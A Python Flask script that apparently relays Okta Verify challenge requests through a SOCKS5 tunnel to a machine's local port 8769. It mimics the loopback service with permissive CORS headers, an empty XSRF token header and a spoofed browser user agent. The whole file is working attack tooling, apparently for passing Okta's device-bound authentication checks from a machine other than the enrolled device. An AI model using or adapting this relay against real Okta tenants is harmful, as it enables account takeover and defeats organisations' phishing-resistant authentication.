#!/usr/bin/env python3
import argparse
import logging
import socks
import socket
import time
from flask import Flask, Response, make_response, request

# Define constants
USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"


def setup_proxy(proxy_host, proxy_port):
    """Set up SOCKS proxy configuration."""
    socks.set_default_proxy(socks.SOCKS5, proxy_host, proxy_port)
    socket.socket = socks.socksocket


def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description='Flask server with SOCKS proxy support')
    parser.add_argument('--proxy-host', type=str, default='127.0.0.1',
                        help='SOCKS proxy host (default: 127.0.0.1)')
    parser.add_argument('--proxy-port', type=int, default=7000,
                        help='SOCKS proxy port (default: 7000)')
    parser.add_argument('--origin', type=str,
                        help='Allowed origin URL (e.g.: https://<company>.okta.com)')
    parser.add_argument('--port', type=int, default=8769,
                        help='Port to run the Flask server on (default: 8769)')
    parser.add_argument('--debug', action='store_true',
                        help='Run Flask in debug mode')
    args = parser.parse_args()
    
    if args.origin.endswith('/'):
        args.origin = args.origin.rstrip('/')
        
    return args


def create_app(origin_url):
    """Create and configure the Flask application."""
    app = Flask(__name__)

    # Handle /probe endpoint for both GET and OPTIONS methods
    @app.route('/probe', methods=['GET', 'OPTIONS'])
    def probe():
        # Return a fixed response for probe endpoint
        headers = {
            "Access-Control-Allow-Methods": "GET, OPTIONS, POST, HEAD",
            "Access-Control-Allow-Origin": origin_url,
            "Access-Control-Allow-Headers": "x-okta-xsrftoken, Origin, X-Requested-With, Content-Type, Accept",
            "Access-Control-Request-Headers": "content-type,x-okta-xsrftoken",
            "Access-Control-Allow-Private-Network": "true"
        }
        return Response("", headers=headers)

    # Handle /challenge endpoint for OPTIONS method
    @app.route('/challenge', methods=['OPTIONS'])
    def challenge_options():
        # Return a fixed response for challenge OPTIONS requests
        headers = {
            "Access-Control-Allow-Methods": "GET, OPTIONS, POST, HEAD",
            "Access-Control-Allow-Origin": origin_url,
            "Access-Control-Allow-Headers": "x-okta-xsrftoken, Origin, X-Requested-With, Content-Type, Accept",
            "Access-Control-Request-Headers": "content-type,x-okta-xsrftoken",
            "Access-Control-Allow-Private-Network": "true"
        }
        return Response("", headers=headers)

    # Handle /challenge endpoint for POST method
    @app.route('/challenge', methods=['POST'])
    def challenge_post():
        print("[+] POST /challenge")
        
        json_data = request.get_json()
        challenge_request = json_data.get('challengeRequest') if json_data else None
        
        GET_data = f"""GET /probe HTTP/1.1
Host: 127.0.0.1:8769
X-Okta-XsrfToken: 
User-Agent: {USER_AGENT}
Content-Type: application/json
Origin: {origin_url}

""".replace("\n", "\r\n").encode()

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(("127.0.0.1", 8769))
            s.sendall(GET_data)
            response_data = s.recv(4096)
            print(response_data.decode())
        
        time.sleep(1)
        
        payload = '{"challengeRequest":"' + challenge_request + '"}'
        POST_data = f"""POST /challenge HTTP/1.1
Host: 127.0.0.1:8769
User-Agent: {USER_AGENT}
Content-Type: application/json
X-Okta-XsrfToken: 
Content-Length: {len(payload)}
Origin: {origin_url}

{payload}""".replace("\n", "\r\n").encode()
        
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: 
            s.connect(("127.0.0.1", 8769))
            s.sendall(POST_data)
            response_data = s.recv(4096)
            print(response_data.decode())
        
        headers = {
            "Access-Control-Allow-Methods": "GET, OPTIONS, POST, HEAD",
            "Access-Control-Allow-Origin": origin_url,
            "Access-Control-Allow-Headers": "x-okta-xsrftoken, Origin, X-Requested-With, Content-Type, Accept",
            "Access-Control-Request-Headers": "content-type,x-okta-xsrftoken",
            "Access-Control-Allow-Private-Network": "true"
        }
        return Response("", headers=headers)

    return app


def main():
    """Main entry point for the application."""
    args = parse_arguments()
    
    # Configure logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    # Set up the SOCKS proxy
    setup_proxy(args.proxy_host, args.proxy_port)
    
    # Create the Flask application
    app = create_app(args.origin)
    
    # Run the Flask web server
    print(f"[+] Starting server on port {args.port}")
    print(f"[+] Using SOCKS5 proxy: {args.proxy_host}:{args.proxy_port}")
    print(f"[+] Allowed origin: {args.origin}")
    app.run(host='127.0.0.1', port=args.port, debug=args.debug)


if __name__ == '__main__':
    main()